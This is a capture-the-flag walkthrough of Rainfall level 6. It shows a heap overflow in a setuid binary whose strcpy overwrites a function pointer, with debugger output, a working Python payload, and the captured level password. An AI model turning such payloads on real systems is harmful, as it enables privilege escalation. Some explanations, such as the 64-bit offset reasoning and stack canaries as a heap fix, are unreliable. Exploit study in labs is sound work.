# Walk-through Level6

## Introduction
Level6 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Binary Information
The binary is a 32-bit ELF executable for the Intel 80386 architecture. It is dynamically linked and not stripped, making it easier to analyze. The following command confirms its properties:
```bash
level6@RainFall:~$ file level6
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level6@RainFall:~$ checksec --file level6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level6
```

**Key observations:**
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.

## Source Code Analysis
The program dynamically allocates two memory regions: one for a string and another for a function pointer. It then copies user input into the first allocation and calls the function pointer, leading to a potential buffer overflow exploit.

Key points:
* Calls `malloc()` to allocate 64 bytes.
* Uses `strcpy()` to copy user input without bounds checking.
* The function pointer is stored immediately after the buffer, leading to a **buffer overflow vulnerability**.
* If the function pointer is overwritten with the address of `n()`, it executes a command to read a password file.

```c
void main(undefined4 param_1, int param_2) {
    char *__dest;
    code **ppcVar1;

    __dest = (char *)malloc(64);
    ppcVar1 = (code **)malloc(4); // 64 + 4 = 68 (buffer) + 4 (function pointer) = 72 bytes total
    *ppcVar1 = m;
    strcpy(__dest, *(char **)(param_2 + 4)); // Vulnerability: buffer overflow
    (**ppcVar1)(); // Function pointer execution
    return;
}

void n(void) {
    system("/bin/cat /home/user/level7/.pass");
    return;
}
```

## Exploitation Strategy

We need to:
1. Overwrite the function pointer after the 64-byte buffer.
2. Redirect execution to `n()`, which prints the password.

### Finding the Overflow Offset
Using a cyclic pattern:
```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```
Finding the exact overwrite offset:
```bash
gdb-peda$ pattern offset 0x65414149
1698775369 found at offset: 72
```

### Finding the Target Function Address
```bash
level6@RainFall:~$ objdump -d level6  | grep -w n
08048454 <n>:
```


### Diving Deep into Heap Memory to Understand What Happens  

I intend to set four breakpoints to observe what happens after `malloc()`, when the address of the `m` function is stored in the second allocation (4), and after the overflow occurs.
```
pwndbg> disassemble 
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
=> 0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
pwndbg> b *0x08048491
Breakpoint 2 at 0x8048491
pwndbg> b *0x080484a1
Breakpoint 3 at 0x80484a1
pwndbg> b *0x080484c2
Breakpoint 4 at 0x80484c2
pwndbg> b *0x080484ca
Breakpoint 5 at 0x80484ca
```

The offset will change due to the difference in architecture from 32-bit to 64-bit. On my host machine, it will be 80, not 72. We will see why.

So, our payload is like:
python2 -c "print 'A'*80 + '\x54\x84\x04\x08'"

Let’s run it and see what happens.

```
r `python2 -c "print 'A'*80 + '\x54\x84\x04\x08'"`
Starting program: /home/kali/rainfall/level6/level6 `python2 -c "print 'A'*80 + '\x54\x84\x04\x08'"` 
pwndbg> c
Continuing.

Breakpoint 2, 0x08048491 in main ()
```
We hit our first breakpoint. Let’s see what happens in the heap using the vis command.

```
pwndbg> vis 
0x804a198       0x00000000      0x00000051      ....Q...
0x804a1a0       0x00000000      0x00000000      ........
0x804a1a8       0x00000000      0x00000000      ........
0x804a1b0       0x00000000      0x00000000      ........
0x804a1b8       0x00000000      0x00000000      ........
0x804a1c0       0x00000000      0x00000000      ........
0x804a1c8       0x00000000      0x00000000      ........
0x804a1d0       0x00000000      0x00000000      ........
0x804a1d8       0x00000000      0x00000000      ........
0x804a1e0       0x00000000      0x00000000      ........
0x804a1e8       0x00000000      0x00021e19      ........         <-- Top chunk
pwndbg> p 0x51
$1 = 81
```
This is what we expected. Malloc allocates 80 bytes instead of 64 in 64-bit architecture, and 72 bytes in 32-bit architecture. We verified that with the cyclic pattern above. Let’s hit the second breakpoint and use vis again.
```
pwndbg> c                                                                                                                                                                                   
Continuing.                                                                                                                                                                         
Breakpoint 3, 0x080484a1 in main ()
pwndbg> vis
0x804a198       0x00000000      0x00000051      ....Q...
0x804a1a0       0x00000000      0x00000000      ........
0x804a1a8       0x00000000      0x00000000      ........
0x804a1b0       0x00000000      0x00000000      ........
0x804a1b8       0x00000000      0x00000000      ........
0x804a1c0       0x00000000      0x00000000      ........
0x804a1c8       0x00000000      0x00000000      ........
0x804a1d0       0x00000000      0x00000000      ........
0x804a1d8       0x00000000      0x00000000      ........
0x804a1e0       0x00000000      0x00000000      ........
0x804a1e8       0x00000000      0x00000011      ........
0x804a1f0       0x00000000      0x00000000      ........
0x804a1f8       0x00000000      0x00021e09      ........         <-- Top chunk
```

Now we see that the second malloc is allocated too. Let’s hit the third breakpoint to check that the address of the m function is passed into the second malloc.

```
pwndbg> c                                                                                                                                                                                   
Continuing.                                                                                                                                                                         
Breakpoint 4, 0x080484c2 in main ()
pwndbg> vis
0x804a198       0x00000000      0x00000051      ....Q...
0x804a1a0       0x00000000      0x00000000      ........
0x804a1a8       0x00000000      0x00000000      ........
0x804a1b0       0x00000000      0x00000000      ........
0x804a1b8       0x00000000      0x00000000      ........
0x804a1c0       0x00000000      0x00000000      ........
0x804a1c8       0x00000000      0x00000000      ........
0x804a1d0       0x00000000      0x00000000      ........
0x804a1d8       0x00000000      0x00000000      ........
0x804a1e0       0x00000000      0x00000000      ........
0x804a1e8       0x00000000      0x00000011      ........
0x804a1f0       0x08048468      0x00000000      h.......
0x804a1f8       0x00000000      0x00021e09      ........         <-- Top chunk

```

And lastly, let’s check what happened after the overflow occurred.

```
pwndbg> c
Continuing.
Breakpoint 5, 0x080484ca in main ()
pwndbg> vis
0x804a198       0x00000000      0x00000051      ....Q...
0x804a1a0       0x41414141      0x41414141      AAAAAAAA 
0x804a1a8       0x41414141      0x41414141      AAAAAAAA  
0x804a1b0       0x41414141      0x41414141      AAAAAAAA 
0x804a1b8       0x41414141      0x41414141      AAAAAAAA 
0x804a1c0       0x41414141      0x41414141      AAAAAAAA 
0x804a1c8       0x41414141      0x41414141      AAAAAAAA 
0x804a1d0       0x41414141      0x41414141      AAAAAAAA 
0x804a1d8       0x41414141      0x41414141      AAAAAAAA
0x804a1e0       0x41414141      0x41414141      AAAAAAAA
0x804a1e8       0x41414141      0x41414141      AAAAAAAA 
0x804a1f0       0x08048454      0x00000000      T.......  
0x804a1f8       0x00000000      0x00021e09      ........         <-- Top chunk   
```

Yay! Now the address we injected has replaced the m address.

## Gaining Access
Exploit the vulnerability by crafting input to overwrite the function pointer with `n()`'s address:
```bash0x0804845
level6@RainFall:~$ ./level6 `python2 -c "print 'A'*72 + '\x54\x84\x04\x08'"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Mitigation Strategies
To secure this binary, the following steps should be taken:
1. **Bounds checking**: Replace `strcpy()` with `strncpy()` to prevent buffer overflows.
2. **Enable stack canaries**: Protect function return addresses from being overwritten.
3. **Use DEP (NX enabled)**: Prevent execution of injected shellcode.
4. **Remove SUID/SGID bits**: Reduce privilege escalation risks.

## Conclusion
This level demonstrates a classic buffer overflow attack exploiting function pointer overwrites. The key takeaway is that improper memory management can lead to severe security vulnerabilities. Proper validation, secure coding practices, and modern security mechanisms should always be used to mitigate such risks.

